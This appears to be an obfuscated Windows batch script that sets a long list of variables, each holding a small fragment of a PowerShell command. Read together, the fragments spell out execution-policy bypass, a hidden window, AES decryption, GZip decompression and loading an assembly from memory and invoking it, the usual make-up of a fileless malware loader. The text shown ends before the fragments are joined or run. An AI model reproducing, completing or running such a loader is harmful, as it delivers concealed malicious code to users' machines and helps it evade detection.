@echo off
set "rbAqKsQSlz=m.IO"
set "BNeEkJtkbE=.Dis"
set "GnbfAqRHwn=rans"
set "EmdFCdDgix=kyhK"
set "ComIhuTDhm=gnir"
set "iDnPNcevgU=yste"
set "TCMjgVkIDD=Fina"
set "YoGDSQcNoX=epR."
set "TBWpBqvVdF=nage"
set "rEjYtIYVAc=$nfE"
set "OHvhFebShU=kjAx"
set "OpcYRKVjPV=R = "
set "kEQHEmvKwz=[Sys"
set "oUSWOXENhe=ing("
set "IHnCfhAdDb=);$U"
set "PHnTVfSmOi=);$s"
set "gZybIipiOl=ose("
set "gNDCrbyrsZ=d;$U"
set "IwhHECSYfh=jQ);"
set "OLxhgkYZUy=('ev"
set "WJkyqXJJrW=bjec"
set "mPrdwfpXaK=;$KV"
set "zYIxIQYwTj=h.Su"
set "zBToVAXekO=]::("
set "zgjzzmeIsq=ring"
set "kyGpqmMtpt=pose"
set "cjwlvsxmzt=Mode"
set "ygBKmbywfp= = $"
set "RdbLTbeVzE=saBm"
set "dVgstzBVCr= New"
set "OSkVdFfMIK=k; }"
set "xmWxBdbWkR=em.I"
set "JyvPBcJGsl=$PYO"
set "oNkBQeXIyl=[Sys"
set "WElXLRhrKX=oin "
set "JnXjrMpdrx=6esa"
set "DdcbNwbwDz=stem"
set "vJXJpqnweu=.GZi"
set "fpQqQpzVmH== $U"
set "BTyqJWpawp=8kuY"
set "ZdQPPkksti=ohjQ"
set "iByfiLWQhH=kjAx"
set "VVdBaYqSCC=gMod"
set "YwnqwdtIfa=ose("
set "bKKzqfDBsk=Stre"
set "xarrbXNQOV=ke($"
set "uLwrjRNOcf= [Sy"
set "iIriwGTgIN=urit"
set "btmubJQtts=)($I"
set "KaFGCuaSvb=Comp"
set "WxYLWjlIpW=Bmor"
set "ajrYHumeqN=ode]"
set "rxYIhfOhmO=onve"
set "MbvBoVqrrg=y.Ci"
set "QcCtktCGyQ=Og);"
set "EaYtpOGvEM=tem."
set "RAwuZQMkeO=THxh"
set "wVBteLFewV=]::N"
set "AUPNQmGIHP=Og ="
set "PpXtQqQgrM=.Cre"
set "kbkfCQVgRN=ck($"
set "QwsvUEbvmE=.Key"
set "CwPVoKsJRG=Wyqo"
set "HngcYkUhOw=Aohj"
set "AxWcgpJUCR=ohjQ"
set "BgaNHktjsp='gni"
set "zIjLhxQLiW=aDNK"
set "JqtciDkPQJ=:('g"
set "KtHSDnyqBB=lit("
set "gGOsXAvuql=.Sec"
set "dhBfmCjfvu=Aohj"
set "RSGrXlwiVk=tion"
set "ctDmNyaNrP=$Aoh"
set "MqbXQjIoFD=mkzA"
set "RKyLlXRnFg=$KVe"
set "MrsftoRVAY=M) {"
set "hUHlqIfKfw=TllA"
set "doyOUjqnRd=$Ukj"
set "qmwWhtRGbx=vert"
set "SjUMmihQZa=BqOA"
set "aKtKeOMQVb=R5jf"
set "CNyoVaFPUn=S46e"
set "YCBOjdMWoN=New-"
set "rWIElTlppq=tem."
set "GhuBDiJbRU=Invo"
set "UaWvAYBEkz=Disp"
set "wSOQwPxpXs=embl"
set "aFntDnsSVt=gMJa"
set "bhJLSyDJZe=.Cry"
set "gHBxIDhLpY=OKn."
set "sJKwlzAIDb=raph"
set "lWRaIwsvPY=se()"
set "kRANxTStAO===')"
set "LrqNVhujtd=($ar"
set "uyovNAnMlH=($ar"
set "NIheUdASYE=Aohj"
set "XRADmmCiiq=ct S"
set "ItEsOZdRgH=kjAx"
set "CbEhejcEkU=.Ass"
set "zluDWAUZGR=stem"
set "nWSYuVMhiV=);$U"
set "UQIrTwAmzd='[-1"
set "ShekwMfCPk=mory"
set "eoYlomqWtv=$Aoh"
set "KPZMZxDNOX=ress"
set "YzhaPIzcBs=I = "
set "vTvwKvhAao=Star"
set "aiBVdmdKcS=Q = "
set "ojsnYUCizy=.Con"
set "neYTsAtLoO=Kn.T"
set "MMttlVBIjb=.Mem"
set "nIvEzMFVlm=wHLL"
set "NrjAXCyPSA= if "
set "PbBmFqmOed=gth)"
set "IURArPswAA=ptor"
set "cRFwbjaEMd=caYI"
set "DnSZRyADBb=rofi"
set "eGJoOqGDKa=Obje"
set "QDBysiWEby=morF"
set "tqDVwlGxPn=Comp"
set "IJGImWTQET=oryS"
set "IWJsdZdDNQ=fore"
set "HoOFnmSpsz=m.Re"
set "QMkUvBavrc=and "
set "PJuhWDNYSH=('da"
set "ngoIuuUcAN=comm"
set "tNZSBdimiL=;$Dw"
set "ATZdjVSWTe=pose"
set "AwpfJWqjSU=sion"
set "nUJBeBjUEN=]::("
set "mloOUwTaRB=; };"
set "YuVDRGmEne=.-16"
set "KrbQGAharc=$nfE"
set "qSvZbjgjTO=rity"
set "IAXkhtTlmz=7;$U"
set "ixqcyXaJOD=pher"
set "tEEeDBTHSy=();$"
set "xybiqwYhhK=();$"
set "BaWKbVRfhi=[-1."
set "sHMRGfvOpn=ewLi"
set "ugvonkmFWq= [st"
set "TmKvpVBzsr=esMa"
set "GbjsVpxyUr=tem."
set "ThTYjwtGHH=daeR"
set "oltUqlzJIr=rity"
set "VtRMlxhXNI=ptog"
set "FkUundIxhc=trea"
set "eLbwQZMgaH=V = "
set "kDXXnmWXuX=HLL."
set "yQkxgpihqb== [S"
set "sjYLDYeQUi=oL'["
set "mLVssdJjgt= [Sy"
set "vKdhOqhMaO=scaY"
set "rAYToOGtQs=ect "
set "GMHRtgOwfj=bypa"
set "ZsMBcwOaAg=tS46"
set "oVQgcOHxHc=y]::"
set "LlcqxHXiQv=Obje"
set "KOXlCRbrCu=V.En"
set "VYrDeadbEW=orF'"
set "ZIoMjUmpzH=F'[-"
set "TtgCelrimI=DNJS"
set "QUeCVKzuXX=ss -"
set "ZZnevcLDHN=ress"
set "ccDWCtlmfb=brea"
set "KGcpVqVLcj=Syst"
set "qdhLiDVPBV=.IO."
set "aLhxVHkhLc=oArr"
set "xvgkmvXtOG=ozh "
set "ztDzzMilKL=();$"
set "llesIaRIgg=pR, "
set "tFgRikBccM=fEOg"
set "fhMwdmMWeY=Og.T"
set "ydRYiorsJE=x.Pa"
set "yRUaZDFkfW=UkjA"
set "sfWLZSDxFG=2VUN"
set "xjnjSOtPDS=ert]"
set "xoYGbHnrJn=$sca"
set "WEqKdaWrLl=.Len"
set "AkYblgZDif=join"
set "LNClyneCem=zm83"
